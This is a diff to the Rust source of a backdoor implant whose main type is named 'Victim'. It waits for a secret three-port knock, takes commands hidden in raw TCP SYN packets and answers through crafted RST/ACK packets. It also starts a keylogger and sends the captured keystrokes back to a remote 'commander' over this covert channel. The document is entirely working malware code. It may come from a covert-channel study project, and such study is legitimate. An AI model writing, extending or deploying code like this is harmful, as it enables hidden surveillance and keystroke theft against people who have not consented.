@@ -1,4 +1,4 @@
-use std::net::{IpAddr, Ipv4Addr};
+use std::net::{IpAddr, Ipv4Addr, TcpListener};
 use std::sync::mpsc::{self, Receiver, Sender};
 use std::thread;
 use std::time::Duration;
@@ -8,7 +8,7 @@ use pnet::packet::Packet;
 use pnet::transport::{transport_channel, TransportChannelType::Layer3, TransportSender, TransportReceiver};
 use pnet::packet::ip::IpNextHeaderProtocols;
 use pnet::datalink::{self, NetworkInterface};
-use std::net::TcpListener;
+
 mod keylogger;
 mod covert;
 mod port_knkr;
@@ -23,15 +23,17 @@ const CMD_REQUEST_KEYLOG: u8 = 0x50;
 
 struct Victim {
     local_ip: Ipv4Addr,
+    interface: NetworkInterface,
     keylog_control_tx: Option<Sender<KeylogControl>>,
     keylog_data_rx:    Option<Receiver<String>>,
 }
 
 impl Victim {
     fn new() -> Self {
-        let (_, local_ip) = Self::find_active_interface().expect("No active interface");
+        let (interface, local_ip) = Self::find_active_interface().expect("No active interface");
         Self {
             local_ip,
+            interface,
             keylog_control_tx: None,
             keylog_data_rx: None,
         }
@@ -48,6 +50,7 @@ impl Victim {
     }
 
     fn wait_for_commander(&self) -> (Ipv4Addr, u16, u16) {
+        println!("[*] Waiting for secret knock on interface {}...", self.interface.name);
         let protocol = Layer3(IpNextHeaderProtocols::Tcp);
         let (_, mut rx) = transport_channel(4096, protocol).unwrap();
         let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);
@@ -55,47 +58,45 @@ impl Victim {
         loop {
             let seed = generate_seed(&self.local_ip, 0);
             let mut rng = SimpleRng::new(seed);
-            let k1 = rng.gen_port();
-            let k2 = rng.gen_port();
+            let knocks = [rng.gen_port(), rng.gen_port(), rng.gen_port()];
             let tx_p = rng.gen_port();
             let rx_p = rng.gen_port();
 
             if let Ok((packet, _)) = rx_iter.next() {
-                let source_ip = packet.get_source(); // Extract source IP here to avoid borrow conflict
+                let source_ip = packet.get_source();
                 if let Some(tcp) = TcpPacket::new(packet.payload()) {
-                    if tcp.get_destination() == k1 {
-                        if let Ok((packet2, _)) = rx_iter.next() {
-                            if let Some(tcp2) = TcpPacket::new(packet2.payload()) {
-                                if tcp2.get_destination() == k2 {
-                                    return (source_ip, tx_p, rx_p);
-                                }
-                            }
+                    if tcp.get_destination() == knocks[0] {
+                        // Potential knock started
+                        let mut knock_count = 1;
+                        let start = std::time::Instant::now();
+                        
+                        while start.elapsed() < Duration::from_secs(5) && knock_count < 3 {
+                             if let Ok((p, _)) = rx_iter.next() {
+                                 if let Some(t) = TcpPacket::new(p.payload()) {
+                                     if t.get_destination() == knocks[knock_count] {
+                                         knock_count += 1;
+                                     }
+                                 }
+                             }
+                        }
+
+                        if knock_count == 3 {
+                            println!("[+] Knock verified! Target Ports -> Listener: {}, Reply: {}", tx_p, rx_p);
+                            return (source_ip, tx_p, rx_p);
                         }
                     }
                 }
             }
-            thread::sleep(Duration::from_millis(10));
         }
     }
 
     pub fn run(&mut self) {
-        // 1. Wait for the secret knock to get the ports
         let (commander_ip, my_port, cmd_port) = self.wait_for_commander();
         
-        // 2. Hijack the port immediately after learning what it is
-        // We bind to 'my_port' because that's where the Commander sends the SYN data
         let _hijacker = TcpListener::bind(format!("0.0.0.0:{}", my_port));
-        
-        match _hijacker {
-            Ok(_) => println!("[*] Port {} hijacked. Kernel RSTs suppressed.", my_port),
-            Err(e) => println!("[!] Warning: Could not hijack port {}: {}. You might need iptables.", my_port, e),
-        }
-
-        // 3. Start the Raw Socket channels
         let protocol = Layer3(IpNextHeaderProtocols::Tcp);
         let (tx, rx) = transport_channel(65535, protocol).expect("Root required");
         
-        // 4. Enter the loop (hijacker stays alive because it's in this scope)
         self.main_loop(tx, rx, commander_ip, my_port, cmd_port);
     }
 
@@ -104,7 +105,6 @@ impl Victim {
         let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);
 
         loop {
-            // Process keylog data and send back to commander
             if let Some(ref rx_chan) = self.keylog_data_rx {
                 while let Ok(line) = rx_chan.try_recv() {
                     self.send_covert_response(line.as_bytes(), &mut tx, commander_ip, my_port, cmd_port);
@@ -112,33 +112,25 @@ impl Victim {
             }
 
             if let Ok((packet, _)) = rx_iter.next() {
-                // Ignore packets not from our commander
                 if packet.get_source() != commander_ip { continue; }
 
                 if let Some(parsed) = covert::parse_syn_from_ipv4_packet(packet.packet()) {
                     if parsed.dst_port == my_port {
-                        // Apply chunk and get the signature to send back
                         if let Ok((_, sig_id)) = receiver_state.apply_chunk(parsed.ip_id, parsed.seq) {
-                            
-                            // Craft the custom RST/ACK with the mathematical signature
                             let rst_params = covert::RstAckParams {
                                 src_ip: self.local_ip,
                                 dst_ip: commander_ip,
                                 src_port: my_port,
                                 dst_port: parsed.src_port,
                                 ack_number: parsed.seq.wrapping_add(1),
-                                ip_id: sig_id, // This is the signature Commander is waiting for
+                                ip_id: sig_id,
                             };
 
                             let rst_pkt = covert::build_rst_ack_packet(&rst_params);
-                            let _ = tx.send_to(
-                                pnet::packet::ipv4::Ipv4Packet::new(&rst_pkt).unwrap(), 
-                                IpAddr::V4(commander_ip)
-                            );
+                            let _ = tx.send_to(pnet::packet::ipv4::Ipv4Packet::new(&rst_pkt).unwrap(), IpAddr::V4(commander_ip));
 
                             if receiver_state.complete {
                                 if let Ok(cmd_str) = receiver_state.message_str() {
-                                    println!("[*] Executing Command: {}", cmd_str);
                                     self.handle_command(&cmd_str, &mut tx, commander_ip, my_port, cmd_port);
                                 }
                                 receiver_state = covert::ReceiverState::new();
@@ -153,7 +145,6 @@ impl Victim {
     fn handle_command(&mut self, cmd: &str, tx: &mut TransportSender, cmd_ip: Ipv4Addr, my_port: u16, cmd_port: u16) {
         let bytes = cmd.as_bytes();
         if bytes.is_empty() { return; }
-        
         match bytes[0] {
             CMD_START_LOGGER => self.start_keylogger(),
             CMD_STOP_LOGGER => self.stop_keylogger(),
@@ -175,7 +166,7 @@ impl Victim {
                 let _ = tx.send_to(pnet::packet::ipv4::Ipv4Packet::new(&syn_pkt).unwrap(), IpAddr::V4(dst_ip));
                 
                 let start = std::time::Instant::now();
-                while start.elapsed() < Duration::from_millis(500) {
+                while start.elapsed() < Duration::from_millis(800) {
                     if let Ok((packet, _)) = rx_iter.next() {
                         if let Some(recv_id) = covert::parse_rst_ack_signature(packet.packet()) {
                             if recv_id == covert::signature_ip_id(ip_id, raw_word) {
@@ -192,17 +183,13 @@ impl Victim {
     fn start_keylogger(&mut self) {
         let (ctrl_tx, ctrl_rx) = mpsc::channel::<KeylogControl>();
         let (data_tx, data_rx) = mpsc::channel::<String>();
-        thread::spawn(move || {
-            let _ = keylogger::run_with_control(ctrl_rx, data_tx);
-        });
+        thread::spawn(move || { let _ = keylogger::run_with_control(ctrl_rx, data_tx); });
         self.keylog_control_tx = Some(ctrl_tx);
         self.keylog_data_rx = Some(data_rx);
     }
 
     fn stop_keylogger(&mut self) {
-        if let Some(tx) = self.keylog_control_tx.take() {
-            let _ = tx.send(KeylogControl::Stop);
-        }
+        if let Some(tx) = self.keylog_control_tx.take() { let _ = tx.send(KeylogControl::Stop); }
         self.keylog_data_rx = None;
     }
 
